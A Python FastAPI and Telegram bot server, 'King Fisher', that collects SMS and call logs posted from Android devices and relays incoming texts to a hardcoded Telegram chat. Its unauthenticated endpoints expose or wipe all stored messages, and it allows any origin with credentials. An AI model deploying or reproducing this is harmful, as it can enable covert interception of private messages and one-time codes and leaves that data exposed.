"""
King Fisher Bot - Real Device Data Integration
Telegram bot that receives and displays real SMS/Call logs from Android devices

Environment Variables:
- BOT_TOKEN: Telegram bot token from BotFather
- PUBLIC_URL: Public URL of the bot (e.g., https://your-bot.onrender.com)
- WEBHOOK_SECRET: Secret token for webhook security

Deployment: Render, Heroku, or any FastAPI-compatible platform
"""

import os
import logging
from contextlib import asynccontextmanager
from typing import Dict, List
from datetime import datetime

from fastapi import FastAPI, Request, Header, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ============ LOGGING ============
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger("KingFisherBot")

# ============ ENVIRONMENT ============
BOT_TOKEN = os.getenv("BOT_TOKEN")
PUBLIC_URL = os.getenv("PUBLIC_URL", "").rstrip("/")
WEBHOOK_SECRET = os.getenv("WEBHOOK_SECRET", "")

if not BOT_TOKEN:
    raise RuntimeError("❌ BOT_TOKEN is not set")
if not PUBLIC_URL:
    raise RuntimeError("❌ PUBLIC_URL is not set")

# ============ TELEGRAM APP ============
telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()

# ============ DATA STORAGE ============
DEVICE_DATA = {
    "sms": {},
    "calls": {},
    "devices": set(),
    "device_names": {}
}
MAX_HISTORY = 100

# ============ NEW: SMS Webhook Storage ============
WEBHOOK_SMS_HISTORY = []

class DeviceDataManager:
    @staticmethod
    def register_device(device_id: str, device_name: str = None):
        DEVICE_DATA["devices"].add(device_id)
        if device_name:
            DEVICE_DATA["device_names"][device_id] = device_name
        elif device_id not in DEVICE_DATA["device_names"]:
            DEVICE_DATA["device_names"][device_id] = device_id

    @staticmethod
    def get_device_name(device_id: str) -> str:
        return DEVICE_DATA["device_names"].get(device_id, device_id)

    @staticmethod
    def get_devices_with_names() -> List[Dict]:
        return [
            {"id": device_id, "name": DeviceDataManager.get_device_name(device_id)}
            for device_id in DEVICE_DATA["devices"]
        ]
    
    @staticmethod
    def get_device_details(device_id: str) -> Dict:
        return {
            "id": device_id,
            "name": DeviceDataManager.get_device_name(device_id),
            "sms_count": len(DEVICE_DATA["sms"].get(device_id, [])),
            "call_count": len(DEVICE_DATA["calls"].get(device_id, [])),
        }
    
    @staticmethod
    def store_sms(device_id: str, sms_list: List[Dict], device_name: str = None):
        if device_id not in DEVICE_DATA["sms"]:
            DEVICE_DATA["sms"][device_id] = []
        for sms in sms_list:
            sms_id = sms.get("id")
            if sms_id:
                existing = [s for s in DEVICE_DATA["sms"][device_id] if s.get("id") == sms_id]
                if not existing:
                    DEVICE_DATA["sms"][device_id].append(sms)
        DEVICE_DATA["sms"][device_id] = DEVICE_DATA["sms"][device_id][-MAX_HISTORY:]
        DeviceDataManager.register_device(device_id, device_name)

    @staticmethod
    def store_calls(device_id: str, call_list: List[Dict], device_name: str = None):
        if device_id not in DEVICE_DATA["calls"]:
            DEVICE_DATA["calls"][device_id] = []
        for call in call_list:
            call_id = call.get("id")
            if call_id:
                existing = [c for c in DEVICE_DATA["calls"][device_id] if c.get("id") == call_id]
                if not existing:
                    DEVICE_DATA["calls"][device_id].append(call)
        DEVICE_DATA["calls"][device_id] = DEVICE_DATA["calls"][device_id][-MAX_HISTORY:]
        DeviceDataManager.register_device(device_id, device_name)

    @staticmethod
    def get_sms(device_id: str, limit: int = 10) -> List[Dict]:
        return DEVICE_DATA["sms"].get(device_id, [])[-limit:]

    @staticmethod
    def get_calls(device_id: str, limit: int = 10) -> List[Dict]:
        return DEVICE_DATA["calls"].get(device_id, [])[-limit:]

    @staticmethod
    def get_stats() -> Dict:
        sms_count = sum(len(v) for v in DEVICE_DATA["sms"].values())
        call_count = sum(len(v) for v in DEVICE_DATA["calls"].values())
        return {
            "devices": len(DEVICE_DATA["devices"]),
            "sms": sms_count,
            "calls": call_count,
            "total": sms_count + call_count
        }

# ============ UI COMPONENTS ============
def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📦 SYSTEM ITEMS", callback_data="items")],
        [InlineKeyboardButton("📨 WEBHOOK SMS", callback_data="webhook_sms")],  # নতুন
        [InlineKeyboardButton("🔄 RESTART", callback_data="restart"), InlineKeyboardButton("🔒 CLOSE", callback_data="close")],
        [InlineKeyboardButton("❓ HELP", callback_data="help"), InlineKeyboardButton("ℹ️ ABOUT", callback_data="about")],
    ])

def items_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📩 SMS INBOX", callback_data="sms"), InlineKeyboardButton("📞 CALL LIST", callback_data="call")],
        [InlineKeyboardButton("📊 SYSTEM STATUS", callback_data="status")],
        [InlineKeyboardButton("📱 DEVICES", callback_data="devices")],
        [InlineKeyboardButton("🔙 BACK TO MAIN", callback_data="back")],
    ])

def back_menu():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK TO MAIN", callback_data="back")]])

# ============ TEXT TEMPLATES ============
OPENING = """<b>╔════════════════════════════╗
   👑 KING FISHER SYSTEM
╚════════════════════════════╝</b>

✨ <b>System initialized successfully</b>

Welcome back, <b>{name}</b>.

🟢 <b>Status:</b> Online
⚡ <b>Mode:</b> Real Data
🛡️ <b>Security:</b> Protected

<i>Select an option below to continue.</i>"""

CLOSING = """<b>╔════════════════════════════╗
      🔒 SESSION CLOSED
╚════════════════════════════╝</b>

Thank you for using <b>King Fisher</b>.

🟡 <b>Status:</b> Standby
🔐 <b>Session:</b> Closed

<i>Send /start whenever you want to open the system again.</i>"""

HELP = """<b>❓ KING FISHER — HELP</b>

📦 <b>System Items</b> — View real SMS/Call logs
📨 <b>Webhook SMS</b> — View SMS from webhook
📱 <b>Devices</b> — View connected devices
🔄 <b>Restart</b> — Refresh interface
🔒 <b>Close</b> — Close current interface
📊 <b>Status</b> — Show system statistics

<i>Data is collected in real-time from your Android device.</i>"""

ABOUT = """<b>ℹ️ ABOUT KING FISHER</b>

👑 <b>King Fisher Bot</b>
Premium Telegram bot with real device integration.

━━━━━━━━━━━━━━━━━━
🟢 Webhook: Active
🟢 Runtime: Python (FastAPI)
🟢 Mode: Real Data
🟢 Platform: Android + Webhook
━━━━━━━━━━━━━━━━━━

<i>Real-time SMS and call log monitoring.</i>"""

# ============ NEW: Webhook SMS Formatter ============
def format_webhook_sms(sms_list: List[Dict]) -> str:
    if not sms_list:
        return "📭 <b>No webhook SMS received yet</b>\n\n<i>Send a webhook request to /webhook endpoint.</i>"
    
    lines = ["📨 <b>WEBHOOK SMS HISTORY</b>", "━━━━━━━━━━━━━━━━━━"]
    
    for i, sms in enumerate(sms_list[-10:][::-1], 1):  # Show latest 10
        phone = sms.get("phoneNumber", "Unknown")
        message = sms.get("message", "")
        time = sms.get("receivedAt", "Unknown")
        msg_id = sms.get("messageId", "N/A")
        
        lines.append(f"{i}. 📱 <b>{phone}</b>")
        lines.append(f"   💬 {message[:80]}{'...' if len(message) > 80 else ''}")
        lines.append(f"   🕐 {time[:19] if time else 'Unknown'}")
        lines.append(f"   🆔 <i>{msg_id}</i>")
        lines.append("")
    
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 <i>Total: {len(sms_list)} messages</i>")
    return "\n".join(lines)

# ============ COMMAND HANDLERS ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name = update.effective_user.first_name or "User"
    await update.message.reply_text(OPENING.format(name=name), parse_mode=ParseMode.HTML, reply_markup=main_menu())

async def restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("<b>🔄 SYSTEM RESTARTED</b>\n\n━━━━━━━━━━━━━━━━━━\n🟢 Interface refreshed\n🟢 Services ready\n🟢 Session active\n━━━━━━━━━━━━━━━━━━", parse_mode=ParseMode.HTML, reply_markup=main_menu())

async def close_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(CLOSING, parse_mode=ParseMode.HTML)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(HELP, parse_mode=ParseMode.HTML, reply_markup=back_menu())

async def about_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(ABOUT, parse_mode=ParseMode.HTML, reply_markup=back_menu())

async def devices_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    devices_list = DeviceDataManager.get_devices_with_names()
    device_details = [DeviceDataManager.get_device_details(dev["id"]) for dev in devices_list]
    await update.message.reply_text(format_device_info(device_details), parse_mode=ParseMode.HTML, reply_markup=back_menu())

# ============ CALLBACK HANDLER ============
async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    d = q.data
    user_id = str(q.from_user.id)
    device_id = f"device_{user_id}"
    
    if d == "items":
        await q.edit_message_text("<b>📦 SYSTEM ITEMS</b>\n\n<i>Select a section:</i>", parse_mode=ParseMode.HTML, reply_markup=items_menu())
    elif d == "sms":
        sms_data = DeviceDataManager.get_sms(device_id, 10)
        await q.edit_message_text(format_realtime_sms(sms_data), parse_mode=ParseMode.HTML, reply_markup=back_menu())
    elif d == "call":
        call_data = DeviceDataManager.get_calls(device_id, 10)
        await q.edit_message_text(format_realtime_calls(call_data), parse_mode=ParseMode.HTML, reply_markup=back_menu())
    elif d == "status":
        stats = DeviceDataManager.get_stats()
        devices_list = DeviceDataManager.get_devices_with_names()
        await q.edit_message_text(format_status(stats, devices_list), parse_mode=ParseMode.HTML, reply_markup=back_menu())
    elif d == "devices":
        devices_list = DeviceDataManager.get_devices_with_names()
        device_details = [DeviceDataManager.get_device_details(dev["id"]) for dev in devices_list]
        await q.edit_message_text(format_device_info(device_details), parse_mode=ParseMode.HTML, reply_markup=back_menu())
    # ===== NEW: Webhook SMS Handler =====
    elif d == "webhook_sms":
        await q.edit_message_text(
            format_webhook_sms(WEBHOOK_SMS_HISTORY),
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu()
        )
    elif d == "restart":
        await q.edit_message_text("<b>🔄 SYSTEM RESTARTED</b>\n\n━━━━━━━━━━━━━━━━━━\n🟢 Interface refreshed\n🟢 Services ready\n🟢 Session active\n━━━━━━━━━━━━━━━━━━", parse_mode=ParseMode.HTML, reply_markup=main_menu())
    elif d == "close":
        await q.edit_message_text(CLOSING, parse_mode=ParseMode.HTML)
    elif d == "help":
        await q.edit_message_text(HELP, parse_mode=ParseMode.HTML, reply_markup=back_menu())
    elif d == "about":
        await q.edit_message_text(ABOUT, parse_mode=ParseMode.HTML, reply_markup=back_menu())
    elif d == "back":
        name = q.from_user.first_name or "User"
        await q.message.reply_text(OPENING.format(name=name), parse_mode=ParseMode.HTML, reply_markup=main_menu())
        await q.message.delete()

# ============ REGISTER HANDLERS ============
telegram_app.add_handler(CommandHandler("start", start))
telegram_app.add_handler(CommandHandler("restart", restart))
telegram_app.add_handler(CommandHandler("close", close_cmd))
telegram_app.add_handler(CommandHandler("help", help_cmd))
telegram_app.add_handler(CommandHandler("about", about_cmd))
telegram_app.add_handler(CommandHandler("devices", devices_cmd))
telegram_app.add_handler(CallbackQueryHandler(callbacks))

# ============ FASTAPI APP ============
@asynccontextmanager
async def lifespan(app: FastAPI):
    await telegram_app.initialize()
    await telegram_app.start()
    webhook_url = f"{PUBLIC_URL}/telegram/webhook"
    await telegram_app.bot.set_webhook(url=webhook_url, secret_token=WEBHOOK_SECRET or None, drop_pending_updates=True)
    logger.info("✅ Webhook configured: %s", webhook_url)
    yield
    try:
        await telegram_app.stop()
        await telegram_app.shutdown()
        logger.info("✅ Bot shut down successfully")
    except Exception as e:
        logger.error(f"❌ Shutdown error: {e}")

app = FastAPI(title="King Fisher Bot", version="3.0.0", description="Real-time SMS and Call Log Monitor", lifespan=lifespan)

app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])

@app.get("/")
async def home():
    return {"status": "online", "service": "King Fisher Bot", "version": "3.0.0", "mode": "Real Data", "docs": "/docs"}

@app.get("/health")
async def health():
    stats = DeviceDataManager.get_stats()
    return {"status": "healthy", "devices": stats["devices"], "messages": stats["total"]}

@app.post("/telegram/webhook")
async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: str | None = Header(default=None)):
    if WEBHOOK_SECRET and x_telegram_bot_api_secret_token != WEBHOOK_SECRET:
        raise HTTPException(status_code=403, detail="Invalid webhook secret")
    try:
        data = await request.json()
        update = Update.de_json(data, telegram_app.bot)
        await telegram_app.process_update(update)
        return {"ok": True}
    except Exception as e:
        logger.error(f"❌ Webhook error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/status")
async def status():
    stats = DeviceDataManager.get_stats()
    devices = DeviceDataManager.get_devices_with_names()
    device_details = [{"id": dev["id"], "name": dev["name"], "sms_count": len(DEVICE_DATA["sms"].get(dev["id"], [])), "call_count": len(DEVICE_DATA["calls"].get(dev["id"], []))} for dev in devices]
    return {"status": "online", "devices": stats["devices"], "sms": stats["sms"], "calls": stats["calls"], "total": stats["total"], "device_list": device_details}

# ============ NEW: SMS Webhook Endpoint ============
@app.post("/webhook")
async def sms_webhook(request: Request):
    """
    SMS রিসিভ ইভেন্ট গ্রহণ ও সংরক্ষণ
    JSON Format:
    {
        "event": "sms:received",
        "payload": {
            "messageId": "msg_12345abcde",
            "message": "Received SMS text",
            "phoneNumber": "+19162255887",
            "simNumber": 1,
            "receivedAt": "2024-06-07T11:41:31.000+07:00"
        }
    }
    """
    try:
        data = await request.json()
        
        if not data:
            raise HTTPException(status_code=400, detail="No JSON data received")
        
        if data.get("event") != "sms:received":
            raise HTTPException(status_code=400, detail="Invalid event type")
        
        payload = data.get("payload", {})
        message_id = payload.get("messageId", "N/A")
        message = payload.get("message", "")
        phone_number = payload.get("phoneNumber", "Unknown")
        sim_number = payload.get("simNumber", 1)
        received_at = payload.get("receivedAt", datetime.now().isoformat())
        
        # সংরক্ষণ
        WEBHOOK_SMS_HISTORY.append({
            "messageId": message_id,
            "message": message,
            "phoneNumber": phone_number,
            "simNumber": sim_number,
            "receivedAt": received_at
        })
        
        # সর্বোচ্চ ৫০০টি রাখা
        if len(WEBHOOK_SMS_HISTORY) > 500:
            WEBHOOK_SMS_HISTORY.pop(0)
        
        # টেলিগ্রামে নোটিফিকেশন (ঐচ্ছিক)
        telegram_message = f"📩 <b>Webhook SMS Received</b>\n\n📱 {phone_number}\n💬 {message[:100]}"
        try:
            await telegram_app.bot.send_message(
                chat_id=os.getenv("CHAT_ID", "7871457632"),
                text=telegram_message,
                parse_mode=ParseMode.HTML
            )
        except:
            pass  # নোটিফিকেশন পাঠাতে না পারলেও সমস্যা নাই
        
        logger.info(f"📩 Webhook SMS from {phone_number}: {message[:50]}...")
        
        return {
            "status": "success",
            "message": "SMS received and stored",
            "stored": len(WEBHOOK_SMS_HISTORY)
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"❌ Webhook error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/webhook/history")
async def webhook_history():
    """সব Webhook SMS ইতিহাস দেখানো"""
    return {
        "total": len(WEBHOOK_SMS_HISTORY),
        "messages": WEBHOOK_SMS_HISTORY[-50:]  # শেষ ৫০টি
    }

@app.delete("/webhook/history")
async def clear_webhook_history():
    """Webhook SMS ইতিহাস মুছে ফেলা"""
    WEBHOOK_SMS_HISTORY.clear()
    return {"status": "success", "message": "Webhook history cleared"}

# ============ FORMATTERS (পুরনো) ============
def format_realtime_sms(sms_list: List[Dict]) -> str:
    if not sms_list:
        return "📭 <b>No SMS messages found</b>\n\n<i>Make sure your Android device is connected and running the sender script.</i>"
    lines = ["<b>📩 REAL SMS INBOX</b>", "━━━━━━━━━━━━━━━━━━"]
    for i, sms in enumerate(sms_list[:10], 1):
        sender = sms.get("sender", "Unknown")
        body = sms.get("body", "")[:100]
        timestamp = sms.get("timestamp", "")
        msg_type = sms.get("type", "received")
        icon = "📥" if msg_type == "received" else "📤"
        time_str = timestamp[:16] if timestamp else "Unknown"
        lines.append(f"{i}. {icon} <b>{sender}</b>")
        lines.append(f"   {body[:80]}{'...' if len(body) > 80 else ''}")
        lines.append(f"   <i>{time_str}</i>")
        lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 <i>Total: {len(sms_list)} messages</i>")
    return "\n".join(lines)

def format_realtime_calls(call_list: List[Dict]) -> str:
    if not call_list:
        return "📭 <b>No call logs found</b>\n\n<i>Make sure your Android device is connected and running the sender script.</i>"
    lines = ["<b>📞 REAL CALL LOGS</b>", "━━━━━━━━━━━━━━━━━━"]
    icons = {"Incoming": "📞", "Outgoing": "📤", "Missed": "❌", "Rejected": "🚫", "Blocked": "⛔", "Voicemail": "🎙️"}
    for i, call in enumerate(call_list[:10], 1):
        number = call.get("number", "Unknown")
        name = call.get("name", "Unknown")
        duration = call.get("duration", "0")
        timestamp = call.get("timestamp", "")
        call_type = call.get("type", "Unknown")
        icon = icons.get(call_type, "📞")
        duration_str = "0s"
        if duration.isdigit():
            dur = int(duration)
            if dur >= 60:
                duration_str = f"{dur//60}m {dur%60}s"
            else:
                duration_str = f"{dur}s"
        time_str = timestamp[:16] if timestamp else "Unknown"
        lines.append(f"{i}. {icon} <b>{name}</b> ({number})")
        lines.append(f"   📱 {call_type} • ⏱️ {duration_str}")
        lines.append(f"   <i>{time_str}</i>")
        lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 <i>Total: {len(call_list)} calls</i>")
    return "\n".join(lines)

def format_status(stats: Dict, devices: List[Dict]) -> str:
    if not devices:
        device_lines = ["   • No device connected"]
    else:
        device_lines = []
        for dev in devices:
            name = dev['name'][:30] + '...' if len(dev['name']) > 30 else dev['name']
            device_lines.append(f"   🟢 <b>{name}</b>")
            device_lines.append(f"      🆔 {dev['id'][:16]}...")
            sms_count = len(DEVICE_DATA["sms"].get(dev['id'], []))
            call_count = len(DEVICE_DATA["calls"].get(dev['id'], []))
            device_lines.append(f"      📩 {sms_count} SMS • 📞 {call_count} Calls")
    return f"""<b>📊 SYSTEM STATUS</b>

━━━━━━━━━━━━━━━━━━
🟢 <b>Bot:</b> Online
🟢 <b>API:</b> Ready
🟢 <b>Webhook:</b> Active

📱 <b>Connected Devices:</b> {stats['devices']}
📩 <b>SMS Messages:</b> {stats['sms']}
📞 <b>Call Logs:</b> {stats['calls']}
📊 <b>Total Records:</b> {stats['total']}

🔗 <b>Active Devices:</b>
{chr(10).join(device_lines)}
━━━━━━━━━━━━━━━━━━
<i>Real-time data from Android devices.</i>"""

def format_device_info(devices: List[Dict]) -> str:
    if not devices:
        return "📭 <b>No device connected</b>\n\n<i>Send data from your Android device first.</i>"
    lines = ["<b>📱 CONNECTED DEVICES</b>", "━━━━━━━━━━━━━━━━━━"]
    for dev in devices:
        name = dev['name'][:25] + '...' if len(dev['name']) > 25 else dev['name']
        lines.append(f"🟢 <b>{name}</b>")
        lines.append(f"   🆔 {dev['id'][:20]}...")
        lines.append(f"   📩 {dev.get('sms_count', 0)} SMS")
        lines.append(f"   📞 {dev.get('call_count', 0)} Calls")
        lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 <i>Total devices: {len(devices)}</i>")
    return "\n".join(lines)
